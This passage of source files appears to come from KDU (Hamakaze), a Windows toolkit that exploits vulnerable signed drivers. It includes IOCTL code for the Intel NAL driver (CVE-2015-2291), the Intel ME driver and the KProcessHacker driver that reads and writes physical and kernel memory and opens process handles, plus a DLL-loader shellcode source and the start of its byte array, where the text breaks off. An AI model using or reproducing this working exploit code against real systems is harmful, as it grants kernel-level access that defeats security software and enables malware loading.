    if (NalVirtualToPhysical(DeviceHandle, VirtualAddress, &physAddress)) {

        if (NalMapAddressEx(DeviceHandle, physAddress, &mappedVirt, NumberOfBytes)) {

            bResult = NalWriteVirtualMemory(DeviceHandle, mappedVirt, Buffer, NumberOfBytes);
            if (bResult == FALSE)
                dwError = GetLastError();

            NalUnmapAddress(DeviceHandle, mappedVirt, NumberOfBytes);
        }
        else {
            dwError = GetLastError();
        }

    }
    else {
        dwError = GetLastError();
    }
    SetLastError(dwError);
    return bResult;
}

/*
* NalReadVirtualMemoryEx
*
* Purpose:
*
* Read virtual memory via mapping.
*
*/
_Success_(return != FALSE)
BOOL WINAPI NalReadVirtualMemoryEx(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID lockedBuffer = (PVOID)supAllocateLockedMemory(NumberOfBytes,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE);

    if (lockedBuffer) {

        ULONG_PTR physicalAddress, newVirt;

        if (NalVirtualToPhysical(DeviceHandle, VirtualAddress, &physicalAddress)) {
            if (NalMapAddressEx(DeviceHandle, physicalAddress, &newVirt, NumberOfBytes)) {

                bResult = NalReadVirtualMemory(DeviceHandle, newVirt, lockedBuffer, NumberOfBytes);
                if (bResult) {
                    RtlCopyMemory(Buffer, lockedBuffer, NumberOfBytes);
                }
                else {
                    dwError = GetLastError();
                }

                NalUnmapAddress(DeviceHandle, newVirt, NumberOfBytes);
            }
        }
        else {
            dwError = GetLastError();
        }

        supFreeLockedMemory(lockedBuffer, NumberOfBytes);
    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* 
* Intel ME driver
* 
*/

/*
* PmxDrvMapMemory
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
*
*/
PVOID PmxDrvMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes)
{
    BOOL bHack = FALSE;
    PVOID pvMappedMemory = NULL;
    PMX_INPUT_BUFFER request;
    PMX_MAPMEM_PACKET packet;

    request.InputSize = sizeof(request) + sizeof(PMX_MAPMEM_PACKET);
    request.Padding = 0;

    packet.Size = sizeof(PMX_MAPMEM_PACKET);
    packet.CommitSize = NumberOfBytes;
    if (PhysicalAddress == 0) { //intel seems filters this
        bHack = TRUE;
        PhysicalAddress = 0x1;
    }

    packet.SectionOffset.QuadPart = PhysicalAddress;

    request.Data = &packet;

    if (supCallDriver(DeviceHandle,
        IOCTL_PMXDRV_MAP_MEMORY,
        &request,
        sizeof(request),
        NULL,
        0))
    {
        if (bHack) {
            packet.SectionOffset.QuadPart &= 0xfff;
            packet.Result -= packet.SectionOffset.QuadPart;
        }
        pvMappedMemory = (PVOID)packet.Result;
    }

    return pvMappedMemory;
}

/*
* PmxDrvUnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID PmxDrvUnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap
)
{
    PMX_INPUT_BUFFER request;
    PMX_UNMAPMEM_PACKET packet;

    request.InputSize = sizeof(request) + sizeof(PMX_UNMAPMEM_PACKET);
    request.Padding = 0;

    RtlSecureZeroMemory(&packet, sizeof(packet));

    packet.Address = SectionToUnmap;
    packet.Size = sizeof(PMX_UNMAPMEM_PACKET);

    request.Data = &packet;

    supCallDriver(DeviceHandle,
        IOCTL_PMXDRV_UNMAP_MEMORY,
        &request,
        sizeof(request),
        NULL,
        0);
}

/*
* PmxDrvReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory.
*
*/
BOOL WINAPI PmxDrvReadWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID mappedSection = NULL;

    //
    // Map physical memory section.
    //
    mappedSection = PmxDrvMapMemory(DeviceHandle,
        PhysicalAddress,
        NumberOfBytes);

    if (mappedSection) {

        __try {

            if (DoWrite) {
                RtlCopyMemory(mappedSection, Buffer, NumberOfBytes);
            }
            else {
                RtlCopyMemory(Buffer, mappedSection, NumberOfBytes);
            }

            bResult = TRUE;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            bResult = FALSE;
            dwError = GetExceptionCode();
        }

        //
        // Unmap physical memory section.
        //
        PmxDrvUnmapMemory(DeviceHandle,
            mappedSection);

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* PmxDrvReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI PmxDrvReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return PmxDrvReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* PmxDrvWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI PmxDrvWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return PmxDrvReadWritePhysicalMemory(DeviceHandle,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* PmxDrvQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI PmxDrvQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    ULONG_PTR pbLowStub1M = 0ULL, PML4 = 0;

    ULONG cbRead = 0x100000;

    *Value = 0;

    SetLastError(ERROR_SUCCESS);

    pbLowStub1M = (ULONG_PTR)PmxDrvMapMemory(DeviceHandle,
        0ULL,
        cbRead);

    if (pbLowStub1M) {

        PML4 = supGetPML4FromLowStub1M(pbLowStub1M);
        if (PML4)
            *Value = PML4;

        PmxDrvUnmapMemory(DeviceHandle,
            (PVOID)pbLowStub1M);

    }

    return (PML4 != 0);
}

/*
* PmxDrvVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI PmxDrvVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return PwVirtualToPhysical(DeviceHandle,
        PmxDrvQueryPML4Value,
        PmxDrvReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);
}

/*
* PmxDrvReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
BOOL WINAPI PmxDrvReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = PmxDrvVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = PmxDrvReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            FALSE);

    }

    return bResult;
}

/*
* PmxDrvWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI PmxDrvWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    SetLastError(ERROR_SUCCESS);

    bResult = PmxDrvVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = PmxDrvReadWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes,
            TRUE);

    }

    return bResult;
}

```

`Source/Hamakaze/idrv/intel.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2024
*
*  TITLE:       INTEL.H
*
*  VERSION:     1.42
*
*  DATE:        01 Apr 2024
*
*  Intel drivers interface header.
* 
*    Network Adapter iQVM64 driver aka Nal
*    Intel(R) Management Engine Tools Driver
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// INTEL NAL driver interface for CVE-2015-2291.
//

#define INTEL_DEVICE_TYPE               (DWORD)0x8086
#define INTEL_DEVICE_FUNCTION           (DWORD)2049

#define NAL_FUNCID_MAPIOSPACE           (DWORD)0x19
#define NAL_FUNCID_UNMAPIOSPACE         (DWORD)0x1A
#define NAL_FUNCID_VIRTUALTOPHYSCAL     (DWORD)0x25
#define NAL_FUNCID_MEMSET               (DWORD)0x30
#define NAL_FUNCID_MEMMOVE              (DWORD)0x33

#define IOCTL_NAL_MANAGE  \
    CTL_CODE(INTEL_DEVICE_TYPE, INTEL_DEVICE_FUNCTION, METHOD_NEITHER, FILE_ANY_ACCESS) //0x80862007


typedef struct _NAL_REQUEST_HEADER {
    ULONG_PTR FunctionId;
    ULONG_PTR Unused0;
} NAL_REQUEST_HEADER, * PNAL_REQUEST_HEADER;

typedef struct _NAL_GET_PHYSICAL_ADDRESS {
    NAL_REQUEST_HEADER Header;
    ULONG_PTR PhysicalAddress;
    ULONG_PTR VirtualAddress;
} NAL_GET_PHYSICAL_ADDRESS, * PNAL_GET_PHYSICAL_ADDRESS;

typedef struct _NAL_MEMMOVE {
    NAL_REQUEST_HEADER Header;
    ULONG_PTR SourceAddress;
    ULONG_PTR DestinationAddress;
    ULONG_PTR Length;
} NAL_MEMMOVE, * PNAL_MEMMOVE;

typedef struct _NAL_MAP_IO_SPACE {
    NAL_REQUEST_HEADER Header;
    ULONG_PTR OpResult; //0 mean success
    ULONG_PTR VirtualAddress;
    ULONG_PTR PhysicalAddress;
    ULONG NumberOfBytes;
} NAL_MAP_IO_SPACE, * PNAL_MAP_IO_SPACE;

typedef struct _NAL_UNMAP_IO_SPACE {
    NAL_REQUEST_HEADER Header;
    ULONG_PTR OpResult; //0 mean success
    ULONG_PTR VirtualAddress;
    ULONG_PTR Unused0;
    ULONG NumberOfBytes;
} NAL_UNMAP_IO_SPACE, * PNAL_UNMAP_IO_SPACE;

//
// Intel ME driver.
//
#define PMXDRV_MAP_FUNCID       (DWORD)0xAAE
#define PMXDRV_UNMAP_FUNCID     (DWORD)0xAAF

#define IOCTL_PMXDRV_MAP_MEMORY     \
    CTL_CODE(FILE_DEVICE_UNKNOWN, PMXDRV_MAP_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x00222AB8

#define IOCTL_PMXDRV_UNMAP_MEMORY   \
    CTL_CODE(FILE_DEVICE_UNKNOWN, PMXDRV_UNMAP_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x00222ABC

#include <pshpack1.h>
typedef struct _PMX_MAPMEM_PACKET {
   ULONG Size;
   LARGE_INTEGER SectionOffset;
   UINT32 CommitSize;
   UINT64 Result;
} PMX_MAPMEM_PACKET, * PPMX_MAPMEM_PACKET;
#include <poppack.h>

typedef struct _PMX_UNMAPMEM_PACKET {
    ULONG Size;
    ULONG Reserved0[2];
    PVOID Address;
} PMX_UNMAPMEM_PACKET, * PPMX_UNMAPMEM_PACKET;

typedef struct _PMX_INPUT_BUFFER {
    PVOID Data;
    ULONG InputSize;
    ULONG Padding;
} PMX_INPUT_BUFFER, * PPMX_INPUT_BUFFER;

BOOL NalCallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID Buffer,
    _In_ ULONG Size);

BOOL NalMapAddressEx(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _Out_ ULONG_PTR* VirtualAddress,
    _In_ ULONG NumberOfBytes);

BOOL NalUnmapAddress(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_ ULONG NumberOfBytes);

BOOL NalVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress);

_Success_(return != FALSE)
BOOL NalReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

_Success_(return != FALSE)
BOOL WINAPI NalWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

_Success_(return != FALSE)
BOOL WINAPI NalReadVirtualMemoryEx(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

_Success_(return != FALSE)
BOOL WINAPI NalWriteVirtualMemoryEx(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI PmxDrvQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value);

BOOL WINAPI PmxDrvVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress);

BOOL WINAPI PmxDrvReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI PmxDrvWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI PmxDrvReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI PmxDrvWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

```

`Source/Hamakaze/idrv/kph.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2023
*
*  TITLE:       KPH.CPP
*
*  VERSION:     1.40
*
*  DATE:        20 Oct 2023
*
*  KProcessHacker2 driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/kph.h"

HANDLE g_KphPhysicalMemorySection = NULL;

/*
* KphpMapMemory
*
* Purpose:
*
* Map physical memory.
*
*/
PVOID KphpMapMemory(
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _In_ BOOL MapForWrite
)
{
    return supMapPhysicalMemory(g_KphPhysicalMemorySection,
        PhysicalAddress,
        NumberOfBytes,
        MapForWrite);
}

/*
* KphpUnmapMemory
*
* Purpose:
*
* Unmap physical memory.
*
*/
VOID KphpUnmapMemory(
    _In_ PVOID BaseAddress
)
{
    supUnmapPhysicalMemory(BaseAddress);
}

/*
* KphpReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory.
*
*/
BOOL WINAPI KphpReadWritePhysicalMemory(
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite)
{
    return supReadWritePhysicalMemory(g_KphPhysicalMemorySection,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        DoWrite);
}

/*
* KphReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI KphReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    UNREFERENCED_PARAMETER(DeviceHandle);

    return KphpReadWritePhysicalMemory(PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* KphWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI KphWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    UNREFERENCED_PARAMETER(DeviceHandle);

    return KphpReadWritePhysicalMemory(PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* KphQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI KphQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    ULONG_PTR pbLowStub1M = 0ULL, PML4 = 0;
    ULONG cbRead = 0x100000;

    UNREFERENCED_PARAMETER(DeviceHandle);

    *Value = 0;

    SetLastError(ERROR_SUCCESS);

    pbLowStub1M = (ULONG_PTR)KphpMapMemory(0ULL,
        cbRead,
        FALSE);

    if (pbLowStub1M) {

        PML4 = supGetPML4FromLowStub1M(pbLowStub1M);
        if (PML4)
            *Value = PML4;

        KphpUnmapMemory((PVOID)pbLowStub1M);

    }

    return (PML4 != 0);
}

/*
* KphVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI KphVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return PwVirtualToPhysical(DeviceHandle,
        KphQueryPML4Value,
        KphReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);
}

/*
* KphReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
BOOL WINAPI KphReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    UNREFERENCED_PARAMETER(DeviceHandle);
    SetLastError(ERROR_SUCCESS);

    bResult = KphVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = KphpReadWritePhysicalMemory(physicalAddress,
            Buffer,
            NumberOfBytes,
            FALSE);

    }

    return bResult;
}

/*
* KphWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI KphWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    UNREFERENCED_PARAMETER(DeviceHandle);
    SetLastError(ERROR_SUCCESS);

    bResult = KphVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = KphpReadWritePhysicalMemory(physicalAddress,
            Buffer,
            NumberOfBytes,
            TRUE);

    }

    return bResult;
}

/*
* KphpDuplicateHandle
*
* Purpose:
*
* Duplicate handle via KPH driver request.
*
*/
BOOL KphpDuplicateHandle(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE SourceProcessId,
    _In_ HANDLE SourceProcessHandle,
    _In_ HANDLE SourceHandle,
    _Out_ PHANDLE TargetHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ULONG HandleAttributes,
    _In_ ULONG Options
)
{
    KPH_DUPLICATE_OBJECT_REQUEST request;

    UNREFERENCED_PARAMETER(SourceProcessId);

    request.DesiredAccess = DesiredAccess;
    request.HandleAttributes = HandleAttributes;
    request.Options = Options;
    request.SourceHandle = SourceHandle;
    request.SourceProcessHandle = SourceProcessHandle;
    request.TargetHandle = TargetHandle;
    request.TargetProcessHandle = NtCurrentProcess();

    return supCallDriver(DeviceHandle,
        IOCTL_KPH_DUPOBJECT,
        &request,
        sizeof(request),
        NULL,
        0);
}

/*
* KphOpenProcess
*
* Purpose:
*
* Open process handle via KPH driver request.
*
*/
BOOL WINAPI KphOpenProcess(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle
)
{
    CLIENT_ID clientId;
    KPH_OPEN_PROCESS_REQUEST request;

    clientId.UniqueProcess = ProcessId;
    clientId.UniqueThread = NULL;

    request.ClientId = &clientId;
    request.ProcessHandle = ProcessHandle;
    request.DesiredAccess = DesiredAccess;

    return supCallDriver(DeviceHandle,
        IOCTL_KPH_OPENPROCESS,
        &request,
        sizeof(request),
        NULL,
        0);
}

/*
* KphRegisterDriver
*
* Purpose:
*
* Driver initialization routine.
*
*/
BOOL WINAPI KphRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    UNREFERENCED_PARAMETER(Param);

    return supOpenPhysicalMemory(DeviceHandle,
        (pfnOpenProcessCallback)KphOpenProcess,
        (pfnDuplicateHandleCallback)KphpDuplicateHandle,
        &g_KphPhysicalMemorySection);
}

/*
* KphUnregisterDriver
*
* Purpose:
*
* Free KPH driver related resources.
*
*/
BOOL WINAPI KphUnregisterDriver(
    _In_ HANDLE DeviceHandle)
{
    UNREFERENCED_PARAMETER(DeviceHandle);

    if (g_KphPhysicalMemorySection) {
        NtClose(g_KphPhysicalMemorySection);
        g_KphPhysicalMemorySection = NULL;
    }

    return TRUE;
}

```

`Source/Hamakaze/idrv/kph.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2023
*
*  TITLE:       KPH.H
*
*  VERSION:     1.40
*
*  DATE:        20 Oct 2023
*
*  KProcessHacker2 driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

#define KPH_DEVICE_TYPE (DWORD)0x9999

#define KPH_FUNCID_OPENPROCESS (DWORD)0x832
#define KPH_FUNCID_DUPLICATEOBJECT (DWORD)0x899

#define IOCTL_KPH_OPENPROCESS    \
    CTL_CODE(KPH_DEVICE_TYPE, KPH_FUNCID_OPENPROCESS, METHOD_NEITHER, FILE_ANY_ACCESS)

#define IOCTL_KPH_DUPOBJECT      \
    CTL_CODE(KPH_DEVICE_TYPE, KPH_FUNCID_DUPLICATEOBJECT, METHOD_NEITHER, FILE_ANY_ACCESS)

typedef struct _KPH_OPEN_PROCESS_REQUEST {
    PHANDLE ProcessHandle;
    ACCESS_MASK DesiredAccess;
    PCLIENT_ID ClientId;
} KPH_OPEN_PROCESS_REQUEST, * PKPH_OPEN_PROCESS_REQUEST;

typedef struct _KPH_DUPLICATE_OBJECT_REQUEST {
    HANDLE SourceProcessHandle;
    HANDLE SourceHandle;
    HANDLE TargetProcessHandle;
    PHANDLE TargetHandle;
    ACCESS_MASK DesiredAccess;
    ULONG HandleAttributes;
    ULONG Options;
} KPH_DUPLICATE_OBJECT_REQUEST, * PKPH_DUPLICATE_OBJECT_REQUEST;

BOOL WINAPI KphRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param);

BOOL WINAPI KphUnregisterDriver(
    _In_ HANDLE DeviceHandle);

BOOL WINAPI KphQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value);

BOOL WINAPI KphVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress);

BOOL WINAPI KphReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI KphWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI KphReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI KphWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI KphOpenProcess(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle);

```

`Source/Hamakaze/idrv/ldrsc.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022
*
*  TITLE:       LDRSC.H
*
*  VERSION:     1.20
*
*  DATE:        10 Feb 2022
*
*  Dll loader shellcode.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

/*
ldrsc.cpp
 
#ifdef _WIN64
#error Compile shell as x86 only
#endif

#if defined (_MSC_VER)
#if (_MSC_VER >= 1900)
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libucrt.lib")
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif
#endif

#include <Windows.h>
#include <intrin.h>
#include "ntos.h"

typedef HMODULE(WINAPI* pfnLoadLibraryA)(LPCSTR lpLibFileName);

PVOID NTAPI RawGetProcAddress(PVOID Module, DWORD FuncHash);
DWORD NTAPI ComputeHash(char* s);

VOID NTAPI main()
{
    PPEB Peb = NtCurrentPeb();
    ULONG c;
    pfnLoadLibraryA xLoadLibraryA;
    CHAR szDll[] = { 'U', '.', 'd', 'l', 'l', 0 };

    PLDR_DATA_TABLE_ENTRY Entry =
        (PLDR_DATA_TABLE_ENTRY)Peb->Ldr->InLoadOrderModuleList.Flink;

    for (c = 0; c < 2; c++)
        Entry = (PLDR_DATA_TABLE_ENTRY)Entry->InLoadOrderLinks.Flink;

    xLoadLibraryA = (pfnLoadLibraryA)RawGetProcAddress(Entry->DllBase, 0x69b37e08);
    if (xLoadLibraryA) {
        xLoadLibraryA(szDll);
    }

}

DWORD NTAPI ComputeHash(char* s)
{
    DWORD h = 0;

    while (*s != 0) {
        h ^= *s;
        h = RotateLeft32(h, 3) + 1;
        s++;
    }

    return h;
}

PVOID NTAPI RawGetProcAddress(PVOID Module, DWORD FuncHash)
{
    PIMAGE_DOS_HEADER           dosh = (PIMAGE_DOS_HEADER)Module;
    PIMAGE_FILE_HEADER          fileh = (PIMAGE_FILE_HEADER)((PBYTE)dosh + sizeof(DWORD) + dosh->e_lfanew);
    PIMAGE_OPTIONAL_HEADER      popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
    DWORD                       ETableVA = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY     pexp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dosh + ETableVA);
    PDWORD                      names = (PDWORD)((PBYTE)dosh + pexp->AddressOfNames), functions = (PDWORD)((PBYTE)dosh + pexp->AddressOfFunctions);
    PWORD                       ordinals = (PWORD)((PBYTE)dosh + pexp->AddressOfNameOrdinals);
    DWORD_PTR                   c, fp;
    PVOID                       fnptr = NULL;

    for (c = 0; c < pexp->NumberOfNames; c++) {
        if (ComputeHash((char*)((PBYTE)dosh + names[c])) == FuncHash) {
            fp = functions[ordinals[c]];
            fnptr = (PBYTE)Module + fp;
            break;
        }
    }

    return fnptr;
}
*/

static unsigned char g_KduLoaderShellcode[191] = {
    0x55, 0x8B, 0xEC, 0x51, 0x51, 0x64, 0xA1, 0x18, 0x00, 0x00, 0x00, 0x6A, 0x02, 0x8B, 0x40, 0x30,
    0xC7, 0x45, 0xF8, 0x55, 0x2E, 0x64, 0x6C, 0x66, 0xC7, 0x45, 0xFC, 0x6C, 0x00, 0x8B, 0x40, 0x0C,
